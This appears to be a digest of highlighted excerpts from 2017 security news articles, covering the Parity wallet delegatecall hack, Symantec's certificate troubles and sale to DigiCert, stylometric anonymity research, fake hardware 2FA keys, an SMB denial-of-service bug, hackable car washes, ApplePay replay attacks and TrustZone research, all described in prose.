- delegatecall works by executing the program code of a contract in the environment (and with the storage) of its calling client contract

- delegatecall allows a client contract to delegate the responsibility of handling a call to another contract.

- So, when an attacker calls Wallet.initWallet(attacker), Wallets fallback function is triggered (Wallet doesnt implement an initWallet function), and the jump table lookup fails. Wallets fallback function then delegatecalls WalletLibrary, forwarding all call data in the process. This call data consists of the function selector for the initWallet(address) function and the attackers address. When WalletLibrary receives the call data, it finds that its initWallet function matches the function selector and runs initWallet(attacker) in the context of Wallet, setting Wallets owner variable to attacker. BOOM! The attacker is now the wallets owner and can withdraw any funds at her leisure.

- A white-hat recovery team (MEH-WH) developers identified and drained all remaining vulnerable wallets into this wallet. They recovered a total of $78 million worth of tokens

## How I tricked Symantec with a Fake Private Key - Hanno's blog

- These rules exist despite the fact that revocation has various problems and doesnt work very well, but thats another topic.  I reported various key compromises to certificate authorities recently and while not all of them reacted in time, they eventually revoked all certificates belonging to the private keys.

- Obviously one would expect that they cryptographically verify that an exposed private key really is the private key belonging to a certificate.  I registered two test domains at a provider that would allow me to hide my identity and not show up in the whois information.

- To make my report less suspicious I searched Pastebin for real, compromised private keys belonging to certificates.

- The answer: I wanted to inform you that your FreeSSL certificate was cancelled as during a log check it was determined that the private key was compromised.  To summarize: Symantec never told the domain owner that the certificate was revoked due to a key leaked on Pastebin.

- (That they ask you to put your private key into a form is a different issue on its own, but at least they have a warning about this and recommend to check locally.

## To truly stay anonymous online, make sure your writing is as dull as the dullest conference call you can imagine

-                                 To publish online and remain anonymous, boffins from Bulgaria and Qatar advise being mediocre

- And if you can't manage that on your own, they have a technique to make your prose less scintillating.                Distinctive writing tends to point to a specific author

- That's what stylometry, the study of linguistic patterns, aims to reveal.                Once the domain of literature professors and forensic experts, stylometry has become a competency of computers, which turn out to be adept at digesting text samples and analyzing them for specific characteristics.                Since 2011, at an annual conference called PAN, researchers have been assessing author identification techniques alongside author obfuscation techniques, an evaluation that echoes the back-and-forth pattern seen in cybersecurity research.                A handful of these number crunchers  Georgi Karadzhov, Tsvetomila Mihaylova, Yasen Kiprov, Georgi Georgiev , and Ivan Koychev from Sophia University and Preslav Nakov from Qatar Computing Research Institute  have released a paper describing improvements in techniques put forth last year to be presented at PAN @ CLEF 2017 in September.                People posting anonymously online expect to remain anonymous, but that's generally unrealistic, the researchers observe, because there are so many ways to track users online

- Even without obvious ways to link anonymous posts to data associated with a known user  IP addresses, user names, and the like  written text often contains clues to an author's identity.                Countering stylometric analysis has its own set of challenges, however.                "Unlike authorship attribution or author profiling, this is not a simple text classification problem but rather a complex text generation task, where not only the authors style has to be hidden, but the text needs to remain grammatically correct and the original meaning has to be preserved as much as possible," the paper states.                The researchers note that techniques like cycling text through a series of machine translations, from one language to another and then back to the original, tends to produce nonsensical word salad

- They're not too keen on selective word substitution either.                The authors' previous attempt to obscure the authorship of sample texts performed well in terms of safety  protecting the author from forensic analysis  but lagged in sensibility  not calling attention to itself as an attempt to conceal authorship.                One of the original passages:                I am proud

- Though I carry my love with me to the tomb, he shall never, never know it.                PAN 2016 text:                myself m proud in them, and though myself carry my beloved with me to the tomb he shall ever ever know it.                As can be seen from the example above, last year's transformation of stands out as odd.                The researchers' revised approach reads better

- This particular sample may only feature only minor variations on the original text, but if it can defy stylometric analysis, it has accomplished its job.                PAN 2017 text:                Im proud of them; and though I carry my beloved with me to the tomb he shall ever ever know it.                The revised approach, which introduces a way to limit the magnitude of text changes, aims for more mediocrity

- Described in more detail in the paper, the technique "pushed towards average values for some general stylometric characteristics, thus making these characteristics less discriminative."                That is, the transformed text scores closer to the average score for metrics like number of nouns, punctuation to word ratios, and the like.                "Overall, we can conclude that our method with transformation magnitude is promising and performs well (better than the three systems that participated in the PAN-2016 Author Obfuscation task) in terms of sensibility and soundness," they explain

## Symantec Sells SSL Business to DigiCert for $950M in Cash and 30% Shares

-   In the face of devastating penalties prepared by Google, Symantec announced plans to sell its SSL issuance certificate business to rival company DigiCert. The price of the acquisition is $950 million in upfront cash and a 30 percent stake in DigiCert stock at the closing of the transaction. At the time of writing, Symantec was the third largest SSL provider on the market after Comodo and IdenTrust, with a market share of 14% and SSL certificates running on 5.5% of the Internet's domains. DigiCert is ranked sixth with a 2.2% market share and certificates on 0.9% of the Internet's sites.

- On the other hand, DigiCert has a bigger presence in the IoT market, where its SSL certs are often used to encrypt traffic between smart devices and vendor servers. Symantec sells SSL business after crushing Google penalties Rumors first surfaced about Symantec looking for buyers three weeks ago.

- The reason why the company sold its business is because of a series of sanctions Google was preparing to impose on Symantec SSL certificates. By late 2018, Google was planning to remove trust in all SSL certificates Symantec ever issued.

- Google was penalizing Symantec because they and Mozilla engineers discovered that the company had mis-issued over 30,000 SSL certificates to the wrong persons/entities. Google gave Symantec a chance to remain on the SSL issuance market, but the company had to issue Symantec-branded certificates through a third-party SSL provider starting December 1, 2017. Symantec decided to sell instead of rebuilding Symantec also had the option to rebuild its SSL issuance business from scratch.

- The decision to sell was Symantec's way of avoiding rebuilding its entire business and ride into the sunset with a giant bag of money. The price of the deal is what Symantec was looking for in mid-July, according to a Reuters report. Comodo, Symantec's main rival, is ecstatic about Symantec's decision to offload its SSL issuance business. Previously, Symantec bought Blue Coat (enterprise products) for $4.65 billion, LifeLock (consumer security products) for $2.3 billion, and sold its Veritas (data storage) division for $7.4 billion.

## Wait. What? The IBM cloud's APIs use insecure TLS1 crypto?  The Register

- 

- An e-mail has gone out from IBM about its Bluemix cloud: after next Tuesday, the SoftLayer APIs will no longer accept connections encrypted with the ancient TLS 1.0. It's not quite a surprise that the 1990s-era protocol was still accepted: a great many services are still midway through their deprecation plans. To give just one example, Salesforce began its phase-out of TLS 1.0 in production instances on July 22, 2017. And the PCI Council, which had originally wanted TLS 1.0 gone last year, had to extend its deprecation date to 30 June 2018 (and it's still blogging early warnings for members, in case they're still failing to catch up). In the Bluemix e-mail, IBM notes: There should be no impact to customers using a modern web client.

- This notification is intended to be informative only. The two services affected by the deprecation are api.softlayer.com and api.service.softlayer.com  so there's another community that's got to pay attention, namely developers who wrote to the APIs and used TLS 1.0 to secure their API access. TLS 1.0 has long been known as insecure, as far back as 2011 when it was bitten by the BEAST exploit.

## Hackers Show Proof of Concepts to Beat Hardware-Based 2FA

-  Hardware tokens, small devices that produce a code or plug into your computer, provide possibly the best way to add an extra lock onto your email account.

- However, we need to be mindful of our hardware, and just because we say this magic token is secure, we don't implicitly assume that," Joe FitzPatrick, one of the researchers behind the project, told Motherboard at the conference.

- In a live demo, FitzPatrick and Leibowitz showed that the YubiKey servers recognized their device as a genuine YubiKey.  Although the proof-of-concept version likely wouldn't trick someone in the flesh, Leibowitz also presented a 3D-printed design that could make the key much more convincing.  As for how an attack might work in practice, a hacker might make a batch of DoobieKeys and then hand them out to attendees at a crypto-party; gatherings where people meet to learn about encryption and security.

- When the victims go and link their fake YubiKey to their Gmail, for example, the attacker also has a copy of their two-factor token.  "It's a supply chain attack; you're modifying them before the user gets them," FitzPatrick told Motherboard.Christopher Harrell, VP of engineering at Yubico told Motherboard in an email, "Today's hardware plus supply chain hacking demonstration at DefCon illustrated that when purchasing security products, both software and hardware, choosing a trustworthy source and carefully evaluating procurement and distribution channels are key.

- Apart from that, attackers will need to get a specific board manufactured which would take a week, and buy a bluetooth module for around $10.  "The tough part would be getting the code to a workable state," FitzPatrick said.  Again, none of this research means that you generally should stop using hardware security devices.

## Windows SMB Zero Day to Be Disclosed During DEF CON

- LAS VEGASA 20-year-old Windows SMB vulnerability is expected to be disclosed Saturday during a talk at DEF CON. Microsoft has said it will not patch the vulnerability, which allows an attacker to remotely crash a Windows server with relative ease using only 20 lines of Python code and a Raspberry Pi.Related Posts					  WannaCry Hero Arrested, One of Two Charged with Distribution of Kronos Malware   August 3, 2017 , 3:57 pm     WannaCry Bitcoin Withdrawn; Killswitch Researcher Detained in Nevada   August 3, 2017 , 2:04 pm     Will The Real Security Community Please Stand Up   August 2, 2017 , 12:21 pm    The vulnerability affects every version of the SMB protocol and every Windows version dating back to Windows 2000.

- It was during that analysis that Dillon uncovered this issue. While working on EternalBlue, we observed a pattern in the way memory allocations were done on the non-paged pool of the Windows kernel.

- We can take that down with a Raspberry Pi. The issue was privately reported to Microsoft in early June as the EternalBlue analysis was completed, Dillon said.

- For enterprise customers who may be concerned, we recommend they consider blocking access from the internet to SMBv1. The reason they say its a moderate issue is because it does require opening many connections to the server, but you could do it all from a single machine, and a Raspberry Pi could take down the beefiest server, Dillon said. The vulnerability lies in the way SMB packets are processed and memory is allocated.

- You dont need a botnet to take down a Windows server. The attack is able to allocate all memory a server has available, to the point where it wont even blue screen, Dillon said.

## Security Flaws In "Smart" Car Wash Can Be Exploited to Cause Physical Injuries

- Two US security researchers have found vulnerabilities in smart car wash solutions sold by PDQ, a US-based vendor of Internet-connected car wash equipment and software.According to the research team, the security flaws could be exploited to cause damage to cars or physical harm to passengers or car wash employees.The vulnerabilities were discovered back in January 2015, but PDQ ignored the research team for almost two years, even after the researchers published some of their findings two years ago.The flaws affect PDQ's LaserWash, LaserJet, and ProTouch car wash rigs, which are sold and installed at car washes across the globe, not just in the US.Car wash rigs come with a (vulnerable) built-in web serverThese complex multi-component devices come with a built-in web server that allows car wash owners and employees to manage the rig from a remote location.In a presentation at this year's Black Hat USA 2015 security conference, the research team said they discovered an authentication bypass in this server's login procedures that allowed them to access the rig's control panel.PDQ car wash server control panelNevertheless, even if they wouldn't have discovered the authentication bypass, the research team said that most owners didn't bother changing the default admin password  12345  which granted attackers access to the rig's full system.Researchers get creative and develop more dangerous exploitsResearchers reported this bug to PDQ in 2015, but the company failed to patch it

- During all this time, while waiting for the company to patch the bug, researchers kept experimenting with the car wash rig.The research team says they developed new exploits in the past two years that take advantage of the authentication bypass or the default password to connect to a PDQ car-washing rig, disable security sensors, and alter default behavior.These modifications to default behavior include alterations to door sensors to make the car wash's doors close when a car or person passes through the frame, damaging cars or hitting people.In addition, the research team also said they could modify the movement of the washing arm to hit cars, or move the arm close to the car and spew water so people would be trapped in their cars

- Similarly, the car wash's doors could also be modified to trap people inside.All of these operations could be automated with a script, so an attacker can scan the Internet for exposed servers, upload his script, and watch mayhem take place across the globe.Vendor promises to fix bugBecause PDQ had failed to patch the initially reported bug and because the research team found ways to truly weaponize their exploits in a novel way, the Industrial Control Systems Cyber Emergency Response Team (ICS-CERT) stepped in and issued a nationwide alert regarding the vendor's insecure equipment.It was only after CERT's involvement that the vendor became responsive and helped issue recommendations for rig owners, such as changing the default password or placing their equipment behind a firewall

- The company also promised a patch to fix the authentication bypass.The team behind this research is comprised of Billy Rios and Jonathan Butts

- Rios has a long history of hacking IoT devices

- In the last few years, Rios has reported bugs in medical care systems, X-ray scanners, and other industrial equipment

- Rios and Butts' presentation and researcher paper are available online.Image credits: PDQ

## Wallet-snatch hack: ApplePay 'vulnerable to attack', claim researchers  The Register

- In the first attack, say the researchers from Positive Technologies, hackers will initially need to infect a jailbroken device with malware.

- The first step in the second attack is for hackers to steal the payment token from a [targeted] victim's phone

- Apple states that the cryptogram should only be used once. However, merchants and payment gateways are often set up to allow cryptograms to be used more than once.

- As the delivery information is sent in cleartext, without checking its integrity, hackers can use an intercepted cryptogram to make subsequent payments on the same website, with the victim charged for these transactions.

- or they can intercept the SSL traffic between the device and the Apple Server to make fraudulent payments directly from the victim's phone

- the victim will get an advisory detailing the transaction as soon as it is made so they may block their card

## Trust Issues: Exploiting TrustZone TEEs

-  Since the Secure Worlds implementation is closely tied to the hardware of the device and the available security mechanisms on the SoC, the TEE OSs require support from and integration with the earlier parts of the devices bootchain, as well as low-level components such as the bootloader.

- Running this script on the firmware collection would allow us to assess how many devices have used the trustlet revocation feature in the past to revoke any vulnerable trusted application (since their version counter would have to be larger than zero).

-  One might be tempted to suggest several stop-gap mitigations, such as filtering the filesystem path from which trustlets are loaded to ensure that they only originate from the system partition (thus raising the bar for a would-be attacker).

-  Samsung has elected to split TIMAs functionality in two; the driver mentioned above provides the ability to map in physical memory, while an accompanying trusted application consumes these services in order to perform the integrity measurements themselves.

-  Since this functionality could be leveraged by attackers, Samsung has rightly decided to enforce a UUID whitelist in order to prevent access by arbitrary trusted applications.

## Intel Launches Movidius Neural Compute Stick: 'Deep Learning and AI' On a $79 USB Stick

- 92520543story Intel Launches Movidius Neural Compute Stick: 'Deep Learning and AI' On a $79 USB Stick  (anandtech.com)   Nate Oh, writing for AnandTech: Today Intel subsidiary Movidius is launching their Neural Compute Stick (NCS), a version of which was showcased earlier this year at CES 2017

- The Movidius NCS adds to Intel's deep learning and AI development portfolio, building off of Movidius' April 2016 launch of the Fathom NCS and Intel's later acquisition of Movidius itself in September 2016

- As Intel states, the Movidius NCS is "the world's first self-contained AI accelerator in a USB format," and is designed to allow host devices to process deep neural networks natively -- or in other words, at the edge

- In turn, this provides developers and researchers with a low power and low cost method to develop and optimize various offline AI applications

- Movidius's NCS is powered by their Myriad 2 vision processing unit (VPU), and, according to the company, can reach over 100 GFLOPs of performance within an nominal 1W of power consumption

- Under the hood, the Movidius NCS works by translating a standard, trained Caffe-based convolutional neural network (CNN) into an embedded neural network that then runs on the VPU

- In production workloads, the NCS can be used as a discrete accelerator for speeding up or offloading neural network tasks

- Otherwise for development workloads, the company offers several developer-centric features, including layer-by-layer neural networks metrics to allow developers to analyze and optimize performance and power, and validation scripts to allow developers to compare the output of the NCS against the original PC model in order to ensure the accuracy of the NCS's model
